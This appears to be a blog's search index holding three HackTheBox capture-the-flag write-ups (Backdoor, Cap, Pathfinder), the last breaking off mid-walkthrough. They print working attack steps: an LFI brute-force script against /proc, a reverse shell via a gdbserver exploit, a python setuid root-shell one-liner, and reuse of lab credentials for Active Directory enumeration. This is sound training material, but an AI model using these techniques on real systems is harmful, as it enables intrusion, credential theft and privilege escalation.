[ { "title": "HackTheBox write-up: Backdoor", "url": "/posts/HTB-Backdoor/", "categories": "Machines, Linux", "tags": "Easy, WordPress, WPScan, LFI, RCE, SUID", "date": "2022-02-06 22:00:00 +0100", "snippet": "This is a write-up for the Backdoor machine on HackTheBox. We’re back after a bit of inactivity, but… here we go. This box is an excellent entry-level challenge for those new to HackTheBox.Basic informationMachine IP: 10.10.11.125 Type: Linux Difficulty: EasyScanningFirst, to find interesting open ports, let’s do some reconnaissance and scanning using nmap.$ nmap -p- --open -T5 -v -n 10.10.11.125Parameters explanation: p-: Scan all 65,535 possible port numbers. open: Only show open (or possibly open) ports. T5: Faster scan (T&lt;0-5&gt;). v: Increase verbosity level. n: Never do DNS resolution.$ nmap -p- --open -T5 -v -n 10.10.11.125Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-05 16:50 CETInitiating Ping Scan at 16:50Scanning 10.10.11.125 [4 ports]Completed Ping Scan at 16:50, 0.05s elapsed (1 total hosts)Initiating SYN Stealth Scan at 16:50Scanning 10.10.11.125 [65535 ports]Discovered open port 22/tcp on 10.10.11.125Discovered open port 80/tcp on 10.10.11.125SYN Stealth Scan Timing: About 34.63% done; ETC: 16:52 (0:00:59 remaining)Discovered open port 1337/tcp on 10.10.11.125Completed SYN Stealth Scan at 16:52, 96.48s elapsed (65535 total ports)Nmap scan report for 10.10.11.125Host is up (0.29s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open http1337/tcp open wasteRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 96.66 seconds Raw packets sent: 76538 (3.368MB) | Rcvd: 76498 (3.060MB)We see that the machine has a Secure Shell (port 22), a web page (port 80) and some mystery 1337 port.EnumerationWe can run Nmap Scripting Engine for service/version detection running through each port for the best results.$ nmap -sVC -p22,80,1337 10.10.11.125Parameters explanation: sV: Service fingerprinting. sC: Launch default NSE nmap scripts. p: Only scan specified ports.$ nmap -sVC -p22,80,1337 10.10.11.125Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-05 16:55 CETNmap scan report for backdoor.htb (10.10.11.125)Host is up (0.040s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)|_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Backdoor &amp;#8211; Real-Life|_http-generator: WordPress 5.8.11337/tcp open waste?Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.85 secondsRelevant information: Port Service Version 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 80 HTTP Apache httpd 2.4.41 1337 waste?   Let’s identify the website with WhatWeb.$ whatweb http://10.10.11.125http://10.10.11.125 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], Email[wordpress@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.125], JQuery[3.6.0], MetaGenerator[WordPress 5.8.1], PoweredBy[WordPress], Script, Title[Backdoor &amp;#8211; Real-Life], UncommonHeaders[link], WordPress[5.8.1]As we have seen, it’s running on Apache server version 2.4.41. It also tells us that the site is based on WordPress CMS. Now’s time to visit the website.There doesn’t seem to be anything useful.Let’s find hidden directories using brute force with Wfuzz.$ wfuzz -c -L -t 300 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.125/FUZZParameters explanation: c: Output with colors. L: Follow HTTP redirections. t: Specify the number of concurrent connections (10 default). hc: Hide responses with the specified code. w: Specify a wordlist file. FUZZ: Wherever you put these keywords wfuzz, will replace them with the values of the specified payload$ wfuzz -c -L -t 300 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.125/FUZZ********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.11.125/FUZZTotal requests: 220560=====================================================================ID Response Lines Word Chars Payload=====================================================================000000786: 200 250 L 2537 W 52159 Ch \"wp-includes\"000007180: 200 98 L 371 W 5674 Ch \"wp-admin\"000000241: 200 0 L 0 W 0 Ch \"wp-content\"000095524: 403 9 L 28 W 277 Ch \"server-status\"Wfuzz finds main WordPress files. At first glance, nothing appears to be interesting except the wp-includes folder, which contains backend files.Vulnerability Analysis &amp; ExploitationEnumeration WordPressSince we know that the website uses WordPress, let’s run wpscan to gather more information and possible vulnerabilities.$ wpscan --url http://backdoor.htb/ --enumerate p,u --plugins-detection aggressive --api-token TOKENParameters explanation: url: The URL of the blog to scan. enumerate: p - Popular plugins, u - Users plugins-detection: Agressive mode to enumerate Plugins. api-token: The WPScan API Token to display vulnerability data, available here.The WPScan identifies an Unauthenticated Stored Cross-Site Scripting (XSS) in the Akismet plugin.Having one vulnerability with path http://backdoor.htb/wp-content/plugins/akismet/. Trying to visit the path, we won’t have permission to access that resource.Since directory listing is allowed, let’s go one directory down.We access the ebook-download folder.Unfortunately, we found nothing interesting.AnalysisSo, let’s try to find ebook plugin exploits. Hopefully, we find something.There seem to be potential exploits. Let’s use exploit number 39575.We encountered an LFI vulnerability. From this vulnerability, we could download the /etc/passwd file, but first, we will download the file wp-config.php that indicates the exploit.wp-config.php seems to have a credential. Trying to login into the WordPress admin panel with the credentials won’t be successful.In the same way, we have done with the wp-config file, doing Directory Traversal, we can download the /etc/passwd file.From the /etc/passwd file, we can see a user named user but nothing useful. We can’t obtain the SSH key of user /home/user/.ssh/id\\_rsa.After being stuck here, I searched the Internet to gain RCE access via LFI. I finally came accros a blog that says we can brute force the PID in the /proc/ directory. In particular /proc/[PID]/cmdline approach.So, to successfully exploit this with brute force, let’s write a Python script filtering the length of responses.#!/bin/python3import signalimport requestsimport sysfrom pwn import *def def_handler(sig, frame): print(\"\\n[!] Stopping the process...\\n\") sys.exit(1)# Ctrl+Csignal.signal(signal.SIGINT, def_handler)# Global variablesmain_url = \"http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/\"empty_resp = 125p1 = log.progress(\"Brute force\")p1.status(\"Starting brute force attack\")for pid in range(0,5000): p1.status(\"Testing pid %d\" % (pid)) content = (requests.get(main_url + str(pid) + \"/cmdline\")).content if (len(content) &gt; empty_resp): print(f\"[+] Process {pid} found\") print(content) print(\"--------------------------------------------\\n\")This outputs:We have found the unknown service running in port 1337 that we previously saw in the scanning phase.Getting complete control (RCE)Searching gdbserver exploits in SearchSploit.We get a RCE result. Let’s get to it!We follow the steps of the exploit to create a reverse shell in a terminal, starting a listener on port 4444 with:$ nc -lvnp 4444Parameters explanation: l: Listen for connections. v: Set verbosity level (can be used several times). n: Do not resolve hostnames via DNS. p: Specify source port to use.We run the exploit.And we obtain a reverse shell! The first step is always stabilizing the shell so we can’t accidentally close the connection if we press something like CTRL+C.$ script /dev/null -c bashCTRL + Z (nc process into the background)$ stty raw -echo; fg$ reset$ xterm$ export TERM=xterm$ export SHELL=bashNow we should have a fully stabilized shell.Now we can get the user.txt flag on user’s home.Privilege EscalationWe already got the user-level flag. Now let’s get the admin flag level.Now let’s search SUID binaries to try to escalate privileges.There is a suspicious binary screen. And googling for privilege escalation through the screen, we find that the screen command has the -x option that we can get attached to an existing screen session, which is running as root.So, the command will be:user@Backdoor: screen -x root/rootDoing that, we extract the root flag, and that’s it.Backdoor has been Pwned!" }, { "title": "HackTheBox write-up: Cap", "url": "/posts/HTB-Cap/", "categories": "Machines, Linux", "tags": "Easy, Network, Wireshark, Web, Capabilities, IDOR", "date": "2021-10-01 17:00:00 +0200", "snippet": "This is a write-up for the Cap machine on HackTheBox. Our first machine after solving the Starting Point series. This box is an excellent entry-level challenge for those new to HackTheBox.Basic informationMachine IP: 10.10.10.245 Type: Linux Difficulty: EasyScanningFirst, to find interesting open ports, let’s do some reconnaissance and scanning using nmap.$ nmap -p- --open -T5 -v -n 10.10.10.245Parameters explanation: p-: Scan all 65,535 possible port numbers. open: Only show open (or possibly open) ports. T5: Faster scan (T&lt;0-5&gt;). v: Increase verbosity level. n: Never do DNS resolution.$ nmap -p- --open -T5 -v -n 10.10.10.245Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-01 19:16 CESTInitiating Ping Scan at 19:16Scanning 10.10.10.245 [2 ports]Completed Ping Scan at 19:16, 0.04s elapsed (1 total hosts)Initiating Connect Scan at 19:16Scanning 10.10.10.245 [65535 ports]Discovered open port 21/tcp on 10.10.10.245Discovered open port 80/tcp on 10.10.10.245Discovered open port 22/tcp on 10.10.10.245Completed Connect Scan at 19:16, 10.83s elapsed (65535 total ports)Nmap scan report for 10.10.10.245Host is up (0.036s latency).Not shown: 65532 closed portsPORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open httpRead data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 10.92 secondsWe see that the machine has a File Transfer Protocol (port 21), Secure Shell (port 22), and a web page (port 80).EnumerationWe can run Nmap Scripting Engine for service/version detection running through each port for the best results.$ nmap -sV -sC -p21,22,80 10.10.10.245Parameters explanation: sV: Service fingerprinting. sC: Launch default NSE nmap scripts. p: Only scan specified ports.$ nmap -sV -sC -p21,22,80 10.10.10.245Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-01 19:18 CESTNmap scan report for 10.10.10.245Host is up (0.036s latency).PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)80/tcp open http gunicorn| fingerprint-strings:| FourOhFourRequest:| HTTP/1.0 404 NOT FOUND| Server: gunicorn| Date: Fri, 01 Oct 2021 17:18:42 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Content-Length: 232| &lt;!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 3.2 Final//EN\"&gt;| &lt;title&gt;404 Not Found&lt;/title&gt;| &lt;h1&gt;Not Found&lt;/h1&gt;| &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;| GetRequest:| HTTP/1.0 200 OK| Server: gunicorn| Date: Fri, 01 Oct 2021 17:18:36 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Content-Length: 19386| &lt;!DOCTYPE html&gt;| &lt;html class=\"no-js\" lang=\"en\"&gt;| &lt;head&gt;| &lt;meta charset=\"utf-8\"&gt;| &lt;meta http-equiv=\"x-ua-compatible\" content=\"ie=edge\"&gt;| &lt;title&gt;Security Dashboard&lt;/title&gt;| &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;| &lt;link rel=\"shortcut icon\" type=\"image/png\" href=\"/static/images/icon/favicon.ico\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/bootstrap.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/font-awesome.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/themify-icons.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/metisMenu.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/owl.carousel.min.css\"&gt;| &lt;link rel=\"stylesheet\" href=\"/static/css/slicknav.min.css\"&gt;| &lt;!-- amchar| HTTPOptions:| HTTP/1.0 200 OK| Server: gunicorn| Date: Fri, 01 Oct 2021 17:18:36 GMT| Connection: close| Content-Type: text/html; charset=utf-8| Allow: GET, OPTIONS, HEAD| Content-Length: 0| RTSPRequest:| HTTP/1.1 400 Bad Request| Connection: close| Content-Type: text/html| Content-Length: 196| &lt;html&gt;| &lt;head&gt;| &lt;title&gt;Bad Request&lt;/title&gt;| &lt;/head&gt;| &lt;body&gt;| &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;| Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;| &lt;/body&gt;|_ &lt;/html&gt;|_http-server-header: gunicorn|_http-title: Security Dashboard1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port80-TCP:V=7.91%I=7%D=10/1%Time=615742EC%P=x86_64-pc-linux-gnu%r(GetRSF:equest,2FE5,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20SF:Fri,\\x2001\\x20Oct\\x202021\\x2017:18:36\\x20GMT\\r\\nConnection:\\x20close\\r\\SF:nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20193SF:86\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20class=\\\"no-js\\\"\\x20lang=\\\"en\\\"&gt;\\SF:n\\n&lt;head&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n\\x20\\x20\\x20\\x2SF:0&lt;meta\\x20http-equiv=\\\"x-ua-compatible\\\"\\x20content=\\\"ie=edge\\\"&gt;\\n\\x20\\SF:x20\\x20\\x20&lt;title&gt;Security\\x20Dashboard&lt;/title&gt;\\n\\x20\\x20\\x20\\x20&lt;meta\\SF:x20name=\\\"viewport\\\"\\x20content=\\\"width=device-width,\\x20initial-scale=SF:1\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"shortcut\\x20icon\\\"\\x20type=\\\"imageSF:/png\\\"\\x20href=\\\"/static/images/icon/favicon\\.ico\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;SF:link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/bootstrap\\.min\\.css\\\"&gt;SF:\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/fonSF:t-awesome\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20SF:href=\\\"/static/css/themify-icons\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=SF:\\\"stylesheet\\\"\\x20href=\\\"/static/css/metisMenu\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x2SF:0&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/css/owl\\.carousel\\.min\\.SF:css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;link\\x20rel=\\\"stylesheet\\\"\\x20href=\\\"/static/cSF:ss/slicknav\\.min\\.css\\\"&gt;\\n\\x20\\x20\\x20\\x20&lt;!--\\x20amchar\")%r(HTTPOptionSF:s,B3,\"HTTP/1\\.0\\x20200\\x20OK\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20Fri,\\x2SF:001\\x20Oct\\x202021\\x2017:18:36\\x20GMT\\r\\nConnection:\\x20close\\r\\nContenSF:t-Type:\\x20text/html;\\x20charset=utf-8\\r\\nAllow:\\x20GET,\\x20OPTIONS,\\x2SF:0HEAD\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRequest,121,\"HTTP/1\\.1\\x2SF:0400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-Type:\\x20textSF:/html\\r\\nContent-Length:\\x20196\\r\\n\\r\\n&lt;html&gt;\\n\\x20\\x20&lt;head&gt;\\n\\x20\\x20SF:\\x20\\x20&lt;title&gt;Bad\\x20Request&lt;/title&gt;\\n\\x20\\x20&lt;/head&gt;\\n\\x20\\x20&lt;body&gt;\\SF:n\\x20\\x20\\x20\\x20&lt;h1&gt;&lt;p&gt;Bad\\x20Request&lt;/p&gt;&lt;/h1&gt;\\n\\x20\\x20\\x20\\x20InvaliSF:d\\x20HTTP\\x20Version\\x20&amp;#x27;Invalid\\x20HTTP\\x20Version:\\x20&amp;#x27;RTSPSF:/1\\.0&amp;#x27;&amp;#x27;\\n\\x20\\x20&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(FourOhFourRequest,189SF:,\"HTTP/1\\.0\\x20404\\x20NOT\\x20FOUND\\r\\nServer:\\x20gunicorn\\r\\nDate:\\x20FSF:ri,\\x2001\\x20Oct\\x202021\\x2017:18:42\\x20GMT\\r\\nConnection:\\x20close\\r\\nSF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20232\\SF:r\\n\\r\\n&lt;!DOCTYPE\\x20HTML\\x20PUBLIC\\x20\\\"-//W3C//DTD\\x20HTML\\x203\\.2\\x20SF:Final//EN\\\"&gt;\\n&lt;title&gt;404\\x20Not\\x20Found&lt;/title&gt;\\n&lt;h1&gt;Not\\x20Found&lt;/h1&gt;SF:\\n&lt;p&gt;The\\x20requested\\x20URL\\x20was\\x20not\\x20found\\x20on\\x20the\\x20serSF:ver\\.\\x20If\\x20you\\x20entered\\x20the\\x20URL\\x20manually\\x20please\\x20chSF:eck\\x20your\\x20spelling\\x20and\\x20try\\x20again\\.&lt;/p&gt;\\n\");Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 130.33 secondsRelevant information: Port Service Version 21 FTP Vsftpd 3.0.3 22 SSH OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 80 HTTP gunicorn Let’s identify the website with WhatWeb.$ whatweb http://10.10.10.245http://10.10.10.245 [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[10.10.10.245], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]We don’t see anything relevant that we don’t know.Vulnerability Analysis &amp; ExplotationWhen browsing http://10.10.10.245 with a web browser, we get a dashboard displaying the result of network monitoring.HTTP EnumerationOn the left side of the website, there is a “Security Snapshot” page. It seems to contain the data of packets that are sent over the network.We can store PCAP files and analyse them later using Wireshark. However, the application didn’t show any packets. So, let’s try to change the path parameter from http://10.10.10.245/data/14 to http://10.10.10.245/data/0. In this case, we have been lucky that with ID 0, we have a result. A good practice would have been to make a python script to discover the different paths for the other IDs.Now let’s download the PCAP file and open it in Wireshark.Analyzing the PCAP fileWhile analyzing the PCAP file, we got the FTP credentials.The FTP credentials founds are:user: nathanpass: Buck3tH4TF0RM3!FootholdWe log in to the FTP port using the creds above.$ ftp 10.10.10.245Connected to 10.10.10.245.220 (vsFTPd 3.0.3)Name (10.10.10.245:skyrex): nathan331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; dir200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxrwxr-x 2 1001 1001 4096 Oct 01 16:07 libnss_x-rwxr-xr-x 1 1001 1001 476162 Oct 01 13:52 linpeas.sh-rw-rw-r-- 1 1001 1001 78576 Oct 01 13:58 linpeas.txt-rw-rw-r-- 1 1001 1001 0 Oct 01 14:02 login.shdrwxrwxr-x 2 1001 1001 4096 Oct 01 16:35 scriptdrwxr-xr-x 3 1001 1001 4096 Oct 01 13:56 snap-rwxrwxr-x 1 1001 1001 1002 Oct 01 16:47 susechfn.sh-rw-rw-r-- 1 1001 1001 2396 Oct 01 16:49 test.cdrwxrwxr-x 3 1001 1001 4096 Oct 01 16:17 tmp-r-------- 1 1001 1001 33 Oct 01 12:58 user.txtIt looks like the FTP server serves the home directory of the user. So let’s try to log in to SHH directly with the same credentials.$ ssh nathan@10.10.10.245nathan@10.10.10.245's password:Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Fri Oct 1 17:33:05 UTC 2021 System load: 0.0 Processes: 249 Usage of /: 39.7% of 8.73GB Users logged in: 1 Memory usage: 41% IPv4 address for eth0: 10.10.10.245 Swap usage: 0% =&gt; There are 4 zombie processes.63 updates can be applied immediately.42 of these updates are standard security updates.To see these additional updates run: apt list --upgradableThe list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Fri Oct 1 16:56:00 2021 from 10.10.14.147-bash-5.0$ iduid=1001(nathan) gid=1001(nathan) groups=1001(nathan)-bash-5.0$ cat user.txtHis home directory contains the user.txt flag, and we have privileges to read it. The next step is to get root access and read the root flag!Privilege EscalationNow let’s search sudo permissions, SUID binaries and capabilities to try to escalate privileges.-bash-5.0$ sudo -l[sudo] password for nathan:Sorry, user nathan may not run sudo on cap.-bash-5.0$ getcap -r / 2&gt;/dev/null/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip/usr/bin/ping = cap_net_raw+ep/usr/bin/traceroute6.iputils = cap_net_raw+ep/usr/bin/mtr-packet = cap_net_raw+ep/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+epFortunately, we have cap_setuid available for the python3.8 binary on the target. Then, a quick search on gtfobins lets us the root shell. GTFOBins is a curated list of Unix binaries we can use to bypass local security restrictions in misconfigured systems.$ python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'-bash-5.0$ python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'# whoamiroot# cd /root# lsroot.txt snapNow we can read the root flag! That’s it. Cap has been Pwned!" }, { "title": "HackTheBox write-up: Pathfinder", "url": "/posts/HTB-Pathfinder/", "categories": "Starting Point, Windows", "tags": "Very Easy, Active Directory, BloodHound, Kerberos, John the Ripper, Evil-WinRM, DCSync attack", "date": "2021-09-25 17:00:00 +0200", "snippet": "This is a write-up for the Pathfinder machine on HackTheBox. It was the fifth machine in their “Starting Point” series.Basic InformationMachine IP: 10.10.10.30 Type: Windows Difficulty: Very EasyScanningFirst, to find interesting open ports, let’s do some reconnaissance and scanning using nmap.$ nmap -p- --open -T5 -v -n 10.10.10.30Parameters explanation: p-: Scan all 65,535 possible port numbers. open: Only show open (or possibly open) ports. T5: Faster scan (T&lt;0-5&gt;). v: Increase verbosity level. n: Never do DNS resolution.It seems to take a long time to scan. Let’s examine it in a faster way.$ nmap -sS --min-rate 5000 -p- --open -vvv -Pn 10.10.10.30Parameters explanation: sS: TCP SYN scan. min-rate: Send packets no slower than &lt;number&gt; per second. p-: Scan all 65,535 possible port numbers. open: Only show open (or possibly open) ports. vvv: Increase verbosity level. Pn: Treat all hosts as online and skip host discovery.$ nmap -sS --min-rate 5000 -p- --open -vvv -Pn 10.10.10.30Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 14:48 CESTInitiating Parallel DNS resolution of 1 host. at 14:48Completed Parallel DNS resolution of 1 host. at 14:48, 1.09s elapsedDNS resolution of 1 IPs took 1.09s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]Initiating SYN Stealth Scan at 14:48Scanning 10.10.10.30 [65535 ports]Discovered open port 445/tcp on 10.10.10.30Discovered open port 53/tcp on 10.10.10.30Discovered open port 135/tcp on 10.10.10.30Discovered open port 139/tcp on 10.10.10.30Discovered open port 49676/tcp on 10.10.10.30Discovered open port 464/tcp on 10.10.10.30Discovered open port 389/tcp on 10.10.10.30Discovered open port 49677/tcp on 10.10.10.30Discovered open port 49698/tcp on 10.10.10.30Discovered open port 593/tcp on 10.10.10.30Discovered open port 5985/tcp on 10.10.10.30Discovered open port 3269/tcp on 10.10.10.30Discovered open port 49718/tcp on 10.10.10.30Discovered open port 49666/tcp on 10.10.10.30Discovered open port 9389/tcp on 10.10.10.30Discovered open port 3268/tcp on 10.10.10.30Discovered open port 636/tcp on 10.10.10.30Discovered open port 49667/tcp on 10.10.10.30Discovered open port 88/tcp on 10.10.10.30Completed SYN Stealth Scan at 14:49, 26.37s elapsed (65535 total ports)Nmap scan report for 10.10.10.30Host is up, received user-set (0.038s latency).Scanned at 2021-09-21 14:48:35 CEST for 26sNot shown: 65516 filtered portsReason: 65516 no-responsesSome closed ports may be reported as filtered due to --defeat-rst-ratelimitPORT STATE SERVICE REASON53/tcp open domain syn-ack ttl 12788/tcp open kerberos-sec syn-ack ttl 127135/tcp open msrpc syn-ack ttl 127139/tcp open netbios-ssn syn-ack ttl 127389/tcp open ldap syn-ack ttl 127445/tcp open microsoft-ds syn-ack ttl 127464/tcp open kpasswd5 syn-ack ttl 127593/tcp open http-rpc-epmap syn-ack ttl 127636/tcp open ldapssl syn-ack ttl 1273268/tcp open globalcatLDAP syn-ack ttl 1273269/tcp open globalcatLDAPssl syn-ack ttl 1275985/tcp open wsman syn-ack ttl 1279389/tcp open adws syn-ack ttl 12749666/tcp open unknown syn-ack ttl 12749667/tcp open unknown syn-ack ttl 12749676/tcp open unknown syn-ack ttl 12749677/tcp open unknown syn-ack ttl 12749698/tcp open unknown syn-ack ttl 12749718/tcp open unknown syn-ack ttl 127Read data files from: /usr/bin/../share/nmapNmap done: 1 IP address (1 host up) scanned in 27.54 seconds Raw packets sent: 131065 (5.767MB) | Rcvd: 33 (1.452KB)We see that the machine has many open ports.EnumerationWe can run Nmap Scripting Engine for service/version detection running through each port for the best results.$ nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49676,49677,49698,49718 10.10.10.30Parameters explanation: sV: Service fingerprinting. sC: Launch default NSE nmap scripts. p: Only scan specified ports.$ nmap -sV -sC -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49667,49676,49677,49698,49718 10.10.10.30Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-21 14:51 CESTNmap scan report for 10.10.10.30Host is up (0.097s latency).PORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-09-21 19:59:56Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message Framing49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49676/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049677/tcp open msrpc Microsoft Windows RPC49698/tcp open msrpc Microsoft Windows RPC49718/tcp open msrpc Microsoft Windows RPCService Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: 7h08m17s| smb2-security-mode:| 2.02:|_ Message signing enabled and required| smb2-time:| date: 2021-09-21T20:00:50|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 99.32 secondsRelevant information: Port Service Version 88 kerberos-sec Microsoft Windows Kerberos 389 ldap Microsoft Windows Active Directory LDAP 3268 ldap Microsoft Windows Active Directory LDAP 5985 http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) So, on port 88, there’s Kerberos running, a network authentication protocol designed to provide strong authentication for client/server applications using secret-key cryptography.Ports 389, 3268 with LDAP. A mature, flexible, and well-supported standards-based mechanism for interacting with directory servers.Port 5985 uses WinRM HTTP, a Windows-native built-in remote management protocol in its simplest form that uses SOAP to interface with remote computers and servers.Vulnerability Analysis &amp; ExploitationEnumeration (Active Directory) As usual on these “Starting Point” machines, credentials are reused from previous machines.We will use Sandra’s credentials extracted during the last Shield box. So we can attempt to enumerate Active Directory using BloodHund. There is a python bloodhound ingester, which can be found here. It can also be installed using pip: pip install bloodhound.$ bloodhound-python -u sandra -p Password1234! -d MEGACORP.LOCAL -c all -ns 10.10.10.30This outputs:$ bloodhound-python -u sandra -p Password1234! -d MEGACORP.LOCAL -c all -ns 10.10.10.30INFO: Found AD domain: megacorp.localINFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCALINFO: Found 1 domainsINFO: Found 1 domains in the forestINFO: Found 1 computersINFO: Connecting to LDAP server: Pathfinder.MEGACORP.LOCALINFO: Found 5 usersINFO: Connecting to GC LDAP server: Pathfinder.MEGACORP.LOCALINFO: Found 51 groupsINFO: Found 0 trustsINFO: Starting computer enumeration with 10 workersINFO: Querying computer: Pathfinder.MEGACORP.LOCALINFO: Done in 00M 10SThis execution will store four json files in the current directory, which it will later import into Bloodhound.The next step is to install and configure the neo4j service, which is an open-source graph database.$ sudo apt install neo4j$ sudo neo4j consoleAfterwards, go to localhost:7474, connect to the database with the credentials neoj4:n4oj4, and you will be prompted to change your password.Next, we start BloodHound.$ bloodhound 